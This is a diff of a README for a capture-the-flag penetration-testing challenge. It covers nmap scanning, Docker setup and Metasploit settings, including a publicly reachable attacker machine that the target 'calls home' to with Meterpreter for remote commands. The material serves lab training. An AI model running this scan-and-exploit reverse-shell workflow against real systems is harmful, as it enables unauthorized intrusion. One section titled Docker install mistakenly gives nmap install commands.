@@ -1,26 +1,26 @@
 Use nmap to scan for open ports of the provided host, identify applications running on each port, use Metaploit or a exploit script you find online to take advantage of the first vulnerability.
 
 #### Getting setup
+
 Here are instructions on how to get your pen-tester environment setup:
 
 #### Instructions for Completing the Challenge
+
 - Run nmap
-- Run metasploit or a different exploit script to take advantage of a vulnerability in the first identified app
+- Run Metasploit or an exploit script to take advantage of a vulnerability in the first identified app
 - Execute commands remotely
-- Find the flag program in the current directory and use it to sign the challenge salt: `./flag <SALT>`
+- Find the flag program in the current directory and use it to sign the challenge salt: `./red_ch1.flag <SALT>`
 
 #### Nmap
-Install nmap.
+Nmap is a port scanner and a frequently utilized tool in the pocket of any pen-tester.
 
+##### Installing Nmap
  
-For RedHat/CentOS:
+For RedHat/CentOS: `sudo yum install nmap`
 
-`sudo yum install nmap`
+For Debian/Ubuntu: `apt-get install nmap`
 
-For Debian/Ubuntu:
-
-`apt-get install nmap`
-
+##### Scanning with Nmap
 
 Once nmap is installed you can scan the target host with `nmap <target_host> -Pn -vv`
 
@@ -30,12 +30,32 @@ Other useful parameters are listed below:
 a range of ports. Examples: `-p22,23,80` -> scan 22,23 and 80 , `-p8000-9000` -> scan a port range, `-p-` -> scan all the ports
 * `-A`: Determine service/version and OS info.
 
-For a detailed list of all parameters availible please refer to the [Nmap Reference Guide](https://nmap.org/book/man.html).
+For a detailed list of all parameters available please refer to the [Nmap Reference Guide](https://nmap.org/book/man.html).
+
+Once you run nmap you will uncover a set of open ports. 
+What services are running on those ports? Can you navigate to each service in a browser?
 
 #### Metasploit
-If you have Docker installed you can simply run the metasploit container image. Metasploit should be installed on a EC2 that is internet accessible to allow for the meterpreter to run. 
 
-Here's how to do it:
+**Note**: this is the cooler option but you will need to get a bit of setup done and you need your exploit machine to be publicly accessible so the vulnerable machine can "call home".
+If you're looking for the quick fix scroll down to the **Exploit Script** option below.
+
+If you have Docker installed you can simply run the metasploit container image. Metasploit should be installed on a EC2 that is internet accessible to allow for the Meterpreter to run. 
+
+##### Docker Install
+
+* For RedHat/CentOS: `sudo yum install nmap` or `sudo amazon-linux-extras install docker` (AWS Linux 2)
+* For Debian/Ubuntu: `apt-get install nmap`
+
+##### Running Docker
+
+* Start Docker with: `sudo service docker start`
+* Add permissions to your userto pull and run container images: `sudo usermod -a -G docker ec2-user`
+* Logout and relogin.
+
+##### Running the Metasploit Image
+
+
 
 Pull metasploit docker image from DockerHub
 
@@ -58,6 +78,10 @@ Set the host and port for the attacker's and victim's machine
 `set RHOSTS <host>`
 
 `set RPORT <port>`
+
+If your target is running on an encrypted port then you need to enable SSL
+
+`set SSL true`
 
 `set LHOST <remote IP of Metasploit machine>`
 
